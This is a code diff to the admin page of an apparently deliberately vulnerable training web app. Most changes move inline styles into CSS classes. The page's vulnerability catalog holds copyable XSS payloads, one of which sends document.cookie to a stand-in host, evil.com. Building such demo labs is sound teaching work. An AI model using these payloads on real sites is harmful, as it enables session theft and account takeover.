@@ -4,6 +4,7 @@ import { BugOutlined, DeleteOutlined, ReloadOutlined, CodeOutlined } from '@ant-
 import { Layout } from '@/components/Layout';
 import { adminService } from '@/services/admin';
 import type { DemoLog } from '@/services/types';
+import './DemoControl.scss';
 
 const { TextArea } = Input;
 const { Option } = Select;
@@ -97,7 +98,7 @@ const DemoControl = () => {
       dataIndex: 'payload',
       key: 'payload',
       render: (payload: string) => payload ? (
-        <code style={{ fontSize: '11px', background: '#f5f5f5', padding: '2px 6px', borderRadius: '4px' }}>
+        <code className="demo-control__payload">
           {payload.substring(0, 50)}{payload.length > 50 && '...'}
         </code>
       ) : '-',
@@ -115,7 +116,7 @@ const DemoControl = () => {
       name: 'Reflected XSS (Search)',
       type: 'XSS',
       description: 'Search query reflected without sanitization',
-      payload: '<img src=x onerror=alert("XSS")>',
+      payload: '<img src=x onerror="alert(\'XSS\')">',
       location: 'Home page search box',
       severity: 'High',
     },
@@ -123,7 +124,7 @@ const DemoControl = () => {
       name: 'Stored XSS (Comments)',
       type: 'XSS',
       description: 'Comments stored and displayed without sanitization',
-      payload: '<script>alert("Stored XSS")</script>',
+      payload: '<img src=x onerror="alert(\'Stored XSS\')">',
       location: 'Post detail page comments',
       severity: 'Critical',
     },
@@ -131,7 +132,7 @@ const DemoControl = () => {
       name: 'DOM-based XSS (Profile Bio)',
       type: 'XSS',
       description: 'Bio field rendered with dangerouslySetInnerHTML',
-      payload: '<img src=x onerror=fetch("http://evil.com?cookie="+document.cookie)>',
+      payload: '<img src=x onerror="fetch(\'http://evil.com?cookie=\'+document.cookie)">',
       location: 'User profile page',
       severity: 'High',
     },
@@ -180,7 +181,7 @@ const DemoControl = () => {
   return (
     <Layout>
       <>
-        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 24 }}>
+        <div className="demo-control__header">
           <h1><BugOutlined /> Security Demo Control Panel</h1>
           <Space>
             <Button icon={<ReloadOutlined />} onClick={loadLogs}>
@@ -200,15 +201,15 @@ const DemoControl = () => {
           description="This demo app contains real security vulnerabilities for educational purposes. Do NOT use this code in production!"
           type="warning"
           showIcon
-          style={{ marginBottom: 24 }}
+          className="demo-control__alert"
         />
 
-        <Card title="Vulnerability Catalog" style={{ marginBottom: 24 }}>
+        <Card title="Vulnerability Catalog" className="demo-control__card">
           <Collapse>
             {vulnerabilityExamples.map((vuln, index) => (
               <Panel
                 header={
-                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <div className="demo-control__panel-header">
                     <span>
                       <Tag color={vuln.severity === 'Critical' ? 'red' : vuln.severity === 'High' ? 'orange' : 'yellow'}>
                         {vuln.severity}
@@ -220,10 +221,10 @@ const DemoControl = () => {
                 }
                 key={index}
               >
-                <div style={{ marginBottom: 12 }}>
+                <div className="demo-control__panel-section">
                   <strong>Description:</strong> {vuln.description}
                 </div>
-                <div style={{ marginBottom: 12 }}>
+                <div className="demo-control__panel-section">
                   <strong>Location:</strong> <code>{vuln.location}</code>
                 </div>
                 <div>
@@ -232,11 +233,11 @@ const DemoControl = () => {
                     value={vuln.payload}
                     readOnly
                     autoSize
-                    style={{ marginTop: 8, fontFamily: 'monospace', fontSize: '12px' }}
+                    className="demo-control__payload-textarea"
                   />
                   <Button
                     size="small"
-                    style={{ marginTop: 8 }}
+                    className="demo-control__copy-button"
                     onClick={() => {
                       navigator.clipboard.writeText(vuln.payload);
                       message.success('Payload copied to clipboard!');
@@ -250,10 +251,10 @@ const DemoControl = () => {
           </Collapse>
         </Card>
 
-        <Card title="Add Demo Log" style={{ marginBottom: 24 }}>
-          <Space direction="vertical" style={{ width: '100%' }}>
+        <Card title="Add Demo Log" className="demo-control__card">
+          <Space direction="vertical" className="demo-control__form">
             <Select
-              style={{ width: '100%' }}
+              className="demo-control__full-width"
               placeholder="Select vulnerability type"
               value={logType}
               onChange={setLogType}
